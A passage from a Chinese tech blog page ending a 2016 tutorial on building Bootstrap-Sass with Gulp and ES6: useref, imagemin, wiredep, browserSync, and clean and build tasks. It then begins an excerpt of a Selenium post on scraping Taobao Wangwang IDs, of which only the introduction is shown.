                  <h3 id="HTML处理"><a href="#HTML处理" class="headerlink" title="HTML处理"></a>HTML处理</h3>
                  <p>我们可以发现，在前面的输出路径都是 .tmp 临时目录，后面还会有一个目录是 dist 目录，试想一下，如果我们编译了 BootStrap 而在 HTML 中没有引用，那编译来还有必要吗？ 所以说，.tmp 作为临时目录，它可以存放被编译后的文件，但是不一定会被引用。被真正引用的文件才是真正有用的文件，我们将它放到 dist 目录。 所以接下来的 HTML 处理就是检查一下有哪些 CSS 和 JS 被引用了，可以将它们合并，然后将新的文件放到 dist 并更新它的引用路径。</p>
                  <figure class="highlight typescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> html = &#123;</span><br><span class="line">    <span class="string">'in'</span>: <span class="string">'assets/*.html'</span>,</span><br><span class="line">    <span class="string">'out'</span>: <span class="string">'dist'</span></span><br><span class="line">&#125;;</span><br><span class="line">gulp.task(<span class="string">'html'</span>, [<span class="string">'styles'</span>, <span class="string">'scripts'</span>], <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(html.in)</span><br><span class="line">        .pipe($.useref(&#123;searchPath: [<span class="string">'.tmp'</span>, <span class="string">'assets'</span>, <span class="string">'.'</span>]&#125;))</span><br><span class="line">        .pipe($.<span class="keyword">if</span>(<span class="string">'*.js'</span>, $.uglify()))</span><br><span class="line">        .pipe($.<span class="keyword">if</span>(<span class="string">'*.css'</span>, $.cssnano()))</span><br><span class="line">        .pipe($.<span class="keyword">if</span>(<span class="string">'*.html'</span>, $.htmlmin(&#123;collapseWhitespace: <span class="literal">true</span>&#125;)))</span><br><span class="line">        .pipe(gulp.dest(html.out));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里定义了一个 task 叫做 html，第二个参数是 styles 和 scripts 组成的数组，意思是在执行这个 task 之前，首先要执行这两个任务。 在处理时用到了 useref 这个插件，它可以检测 HTML 中引用的 CSS 和 JS，可以执行合并和压缩，然后更新新的路径。 这个插件的作用如上所述。 比如 HTML 当前内容是这样的</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- bower:css --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- endbower --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- build:css css/combined.css --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"../.tmp/css/bootstrap.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- endbuild --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Hello This is a Gulp Sass Demo Configured by Germey.<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- bower:js --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- endbower --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- build:js js/combined.js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"javascripts/bootstrap.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"javascripts/bootstrap-sprockets.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- endbuild --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">&lt;!-- build:css css/combined.css --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"../.tmp/css/bootstrap.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- endbuild --&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里引用了 .tmp 目录下的 bootstrap.css，然后在外面用注释的形式定义了构建的路径和文件名。 那么执行这个任务之后，它便会将当前引用的 .tmp 目录下的 bootstrap.css 处理并输出为 combined.css，然后新生成的 HTML 文件的引用路径也相应改为 combined.css JS 也是同理</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">&lt;!-- build:js js/combined.js --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"javascripts/bootstrap.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"javascripts/bootstrap-sprockets.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- endbuild --&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在此处是将两个文件处理合并为 combined.js 执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp html</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>后，会新生成一个 HTML 文件到 dist 目录，内容为</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="comment">&lt;!-- bower:css --&gt;</span><span class="comment">&lt;!-- endbower --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/combined.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h4</span>&gt;</span>Hello This is a Gulp Sass Demo Configured by Germey.<span class="tag">&lt;/<span class="name">h4</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="comment">&lt;!-- bower:js --&gt;</span><span class="comment">&lt;!-- endbower --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/combined.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>dist 的目录结构为</p>
                  <figure class="highlight gherkin">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">|<span class="string">____css</span></span><br><span class="line">|<span class="string"> </span>|<span class="string">____combined.css</span></span><br><span class="line">|<span class="string">____index.html</span></span><br><span class="line">|____js</span><br><span class="line">|<span class="string"> </span>|<span class="string">____combined.js</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>以上为利用 useref 插件进行 HTML 处理的过程。</p>
                  <h3 id="图片压缩处理"><a href="#图片压缩处理" class="headerlink" title="图片压缩处理"></a>图片压缩处理</h3>
                  <p>接下来是对图片字体及其他格式文件的处理。 图片的主要处理是进行压缩</p>
                  <figure class="highlight typescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> images = &#123;</span><br><span class="line">    <span class="string">'in'</span>: <span class="string">'assets/images/**/*'</span>,</span><br><span class="line">    <span class="string">'out'</span>: <span class="string">'dist/images'</span></span><br><span class="line">&#125;;</span><br><span class="line">gulp.task(<span class="string">'images'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(images.in)</span><br><span class="line">        .pipe($.imagemin(&#123;</span><br><span class="line">            progressive: <span class="literal">true</span>,</span><br><span class="line">            interlaced: <span class="literal">true</span>,</span><br><span class="line">            svgoPlugins: [&#123;cleanupIDs: <span class="literal">false</span>&#125;]</span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe(gulp.dest(images.out));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>定义好了 images 的输入和输出路径之后，定义 images 这个 task，在这里使用了 imagemin 这个插件 imagemin 插件是用来压缩图片的插件，处理后图片的占用空间会变小。 执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp images</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>即可完成对图片的压缩</p>
                  <h3 id="字体处理"><a href="#字体处理" class="headerlink" title="字体处理"></a>字体处理</h3>
                  <p>字体的处理，筛选出某些特定格式的字体，输出到指定目录</p>
                  <figure class="highlight php">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> fonts = &#123;</span><br><span class="line">    <span class="string">'in'</span>: [<span class="string">'assets/fonts/bootstrap/*'</span>],</span><br><span class="line">    <span class="string">'tmp'</span>: <span class="string">'.tmp/fonts'</span>,</span><br><span class="line">    <span class="string">'out'</span>: <span class="string">'dist/fonts'</span></span><br><span class="line">&#125;;</span><br><span class="line">gulp.task(<span class="string">'fonts'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(<span class="keyword">require</span>(<span class="string">'main-bower-files'</span>)(<span class="string">'**/*.&#123;eot,svg,ttf,woff,woff2&#125;'</span>, <span class="function"><span class="keyword">function</span><span class="params">(err)</span> </span>&#123;</span><br><span class="line">    &#125;)</span><br><span class="line">        .concat(fonts.in))</span><br><span class="line">        .pipe(gulp.dest(fonts.tmp))</span><br><span class="line">        .pipe(gulp.dest(fonts.out));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp fonts</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>即可完成字体的处理</p>
                  <h3 id="额外文件处理"><a href="#额外文件处理" class="headerlink" title="额外文件处理"></a>额外文件处理</h3>
                  <p>在项目中还存在非 HTML 的文件，比如 视频，音频，PHP等。这些做一下统一判断然后归档即可。</p>
                  <figure class="highlight coffeescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">const extras = &#123;</span><br><span class="line">    <span class="string">'in'</span>: [</span><br><span class="line">        <span class="string">'assets/*.*'</span>,</span><br><span class="line">        <span class="string">'!assets/*.html'</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="string">'out'</span>: <span class="string">'dist'</span></span><br><span class="line">&#125;;</span><br><span class="line">gulp.task(<span class="string">'extras'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(extras.<span class="keyword">in</span>, &#123;</span><br><span class="line">        dot: <span class="literal">true</span></span><br><span class="line">    &#125;).pipe(gulp.dest(extras.out));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>其中 in 指定了在 asset 目录中除 html 后缀的文件，此处进行读入筛选，然后输出到指定路径即可。 执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp extras</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>即可完成额外文件的处理</p>
                  <h3 id="文件依赖处理"><a href="#文件依赖处理" class="headerlink" title="文件依赖处理"></a>文件依赖处理</h3>
                  <p>设想一个情景，一个项目需要很多很多依赖库，我们在 bower.json 中定义好了所有的依赖，使用 bower 将他们下载了下来，如果我们需要在 HTML 中引用他们，如果我们还是手动地添加一个个引用那是不是太麻烦了？ 没错，这个操作同样可以自动化操作，借助 wiredep 插件即可。</p>
                  <figure class="highlight typescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> wire = &#123;</span><br><span class="line">    <span class="string">'in'</span>: <span class="string">'assets/*.html'</span>,</span><br><span class="line">    <span class="string">'out'</span>: <span class="string">'dist'</span></span><br><span class="line">&#125;;</span><br><span class="line">gulp.task(<span class="string">'wiredep'</span>, <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    gulp.src(wire.in)</span><br><span class="line">        .pipe(wiredep(&#123;</span><br><span class="line">            ignorePath: <span class="regexp">/^(\.\.\/)*\.\./</span></span><br><span class="line">        &#125;))</span><br><span class="line">        .pipe($.useref(&#123;searchPath: [<span class="string">'.tmp'</span>, <span class="string">'assets'</span>, <span class="string">'.'</span>]&#125;))</span><br><span class="line">        .pipe($.<span class="keyword">if</span>(<span class="string">'*.js'</span>, $.uglify()))</span><br><span class="line">        .pipe($.<span class="keyword">if</span>(<span class="string">'*.css'</span>, $.cssnano()))</span><br><span class="line">        .pipe(gulp.dest(wire.out));</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里使用了 wiredep 插件。 在 HTML中定义如下内容</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">&lt;!-- bower:js --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- endbower --&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>执行</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">gulp wiredep</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>之后，便会自动更新 bower.json 中所有依赖库的引用，在这里以 JS 为例子。 当前在 bower.json 中定义了</p>
                  <figure class="highlight 1c">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="string">"dependencies"</span>: &#123;</span><br><span class="line">    <span class="string">"jquery"</span>: <span class="string">"&gt;= 1.9.0"</span></span><br><span class="line">  &#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>执行完毕之后，HTML中便有了</p>
                  <figure class="highlight xml">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">&lt;!-- bower:js --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/bower_components/jquery/dist/jquery.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- endbower --&gt;</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>路径会随之更新。</p>
                  <h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3>
                  <p>最后是一个 serve 的 task 在本地搭建一个服务器来测试，同时监听文件的变动随时更新资源文件。</p>
                  <figure class="highlight pgsql">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">const serve = &#123;</span><br><span class="line">    <span class="string">'baseDir'</span>: [<span class="string">'.tmp'</span>, <span class="string">'assets'</span>],</span><br><span class="line">    <span class="string">'baseDirDist'</span>: [<span class="string">'dist'</span>],</span><br><span class="line">    <span class="string">'routes'</span>: &#123;</span><br><span class="line">        <span class="string">'/bower_components'</span>: <span class="string">'bower_components'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'port'</span>: <span class="number">9000</span></span><br><span class="line">&#125;;</span><br><span class="line">gulp.task(<span class="string">'serve'</span>, [<span class="string">'styles'</span>, <span class="string">'scripts'</span>, <span class="string">'fonts'</span>, <span class="string">'wiredep'</span>], () =&gt; &#123;</span><br><span class="line">    browserSync(&#123;</span><br><span class="line">        <span class="keyword">notify</span>: <span class="keyword">false</span>,</span><br><span class="line">        port: serve.port,</span><br><span class="line">        <span class="keyword">server</span>: &#123;</span><br><span class="line">            baseDir: serve.baseDir,</span><br><span class="line">            routes: serve.routes</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    gulp.watch([</span><br><span class="line">        html.<span class="keyword">out</span>, scripts.tmp, scripts.<span class="keyword">out</span>, images.<span class="keyword">out</span>, fonts.tmp, fonts.<span class="keyword">out</span></span><br><span class="line">    ]).<span class="keyword">on</span>(<span class="string">'change'</span>, reload);</span><br><span class="line">    gulp.watch(styles.<span class="keyword">in</span>, [<span class="string">'styles'</span>]);</span><br><span class="line">    gulp.watch(scripts.<span class="keyword">in</span>, [<span class="string">'scripts'</span>]);</span><br><span class="line">    gulp.watch(fonts.<span class="keyword">in</span>, [<span class="string">'fonts'</span>]);</span><br><span class="line">    gulp.watch(<span class="string">'bower.json'</span>, [<span class="string">'wiredep'</span>, <span class="string">'fonts'</span>]);</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(<span class="string">'serve:dist'</span>, () =&gt; &#123;</span><br><span class="line">    browserSync(&#123;</span><br><span class="line">        <span class="keyword">notify</span>: <span class="keyword">false</span>,</span><br><span class="line">        port: serve.port,</span><br><span class="line">        <span class="keyword">server</span>: &#123;</span><br><span class="line">            baseDir: serve.baseDirDist</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>上述 serve 首先要执行 styles, scripts, fonts, wiredep 的操作，然后在 9000 端口上运行。 同时利用 watch 方法监听文件的变动，随时更新。</p>
                  <h3 id="删除和一键构建"><a href="#删除和一键构建" class="headerlink" title="删除和一键构建"></a>删除和一键构建</h3>
                  <p>最后还有清理构建文件和一键构建的功能。 清理 task 叫做 clean。</p>
                  <figure class="highlight gradle">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">gulp.<span class="keyword">task</span>(<span class="string">'clean'</span>, del.bind(<span class="keyword">null</span>, [<span class="string">'.tmp'</span>, <span class="string">'dist'</span>]));</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>即将 .tmp 和 dist 目录进行清理。 一键构建就是执行其他所有操作，将所有操作汇总。</p>
                  <figure class="highlight coffeescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">const build = &#123;</span><br><span class="line">    <span class="string">'in'</span>: <span class="string">'dist/**/*'</span></span><br><span class="line">&#125;;</span><br><span class="line">gulp.task(<span class="string">'build'</span>, [<span class="string">'lint'</span>, <span class="string">'html'</span>, <span class="string">'images'</span>, <span class="string">'fonts'</span>, <span class="string">'extras'</span>], <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src(build.<span class="keyword">in</span>).pipe($.size(&#123;title: <span class="string">'build'</span>, gzip: <span class="literal">true</span>&#125;));</span><br><span class="line">&#125;);</span><br><span class="line">gulp.task(<span class="string">'default'</span>, [<span class="string">'clean'</span>], <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    gulp.start(<span class="string">'build'</span>);</span><br><span class="line">&#125;);</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>最后执行了一个总的压缩汇总，</p>
                  <h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2>
                  <p>以上便是利用 Gulp 编译 Bootstrap-Sass 的全部过程。 整个项目的代码如下 <a href="https://github.com/Germey/GulpBootStrapSass" target="_blank" rel="noopener">GulpBootstrapSass</a> 如果有问题，欢迎留言交流，希望对大家有帮助！</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-07-04 00:23:02" itemprop="dateCreated datePublished" datetime="2016-07-04T00:23:02+08:00">2016-07-04</time>
                </span>
                <span id="/2906.html" class="post-meta-item leancloud_visitors" data-flag-title="基于ES6利用Gulp编译BootStrap-Sass源码" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>12k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>11 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2852.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2852.html" class="post-title-link" itemprop="url">Python爬虫实战八之利用Selenium抓取淘宝匿名旺旺</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="2022-年最新-Python3-网络爬虫教程"><a href="#2022-年最新-Python3-网络爬虫教程" class="headerlink" title="2022 年最新 Python3 网络爬虫教程"></a>2022 年最新 Python3 网络爬虫教程</h2>
                  <p>大家好，我是崔庆才，由于爬虫技术不断迭代升级，一些旧的教程已经过时、案例已经过期，最前沿的爬虫技术比如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等技术层出不穷，我最近新出了一套最新最全面的 Python3 网络爬虫系列教程。</p>
                  <blockquote>
                    <p>博主自荐：截止 2022 年，可以将最前沿最全面的爬虫技术都涵盖的教程，如异步、JavaScript 逆向、安卓逆向、智能解析、WebAssembly、大规模分布式、Kubernetes 等，市面上目前就这一套了。</p>
                  </blockquote>
                  <p>最新教程对旧的爬虫技术内容进行了全面更新，搭建了全新的案例平台进行全面讲解，保证案例稳定有效不过期。</p>
                  <p>教程请移步：</p>
                  <p><a href="https://cuiqingcai.com/17777.html">【2022 版】Python3 网络爬虫学习教程</a></p>
                  <p>如下为原文。</p>
                  <h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2>
                  <p>其实本文的初衷是为了获取淘宝的非匿名旺旺，在淘宝详情页的最下方有相关评论，含有非匿名旺旺号，快一年了淘宝都没有修复这个。 可就在今天，淘宝把所有的账号设置成了匿名显示，SO，获取非匿名旺旺号已经不可能了。那本节就带大家抓取匿名旺旺号熟悉一下 Selenium 吧。</p>
                  <p>2016/7/1</p>
                  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
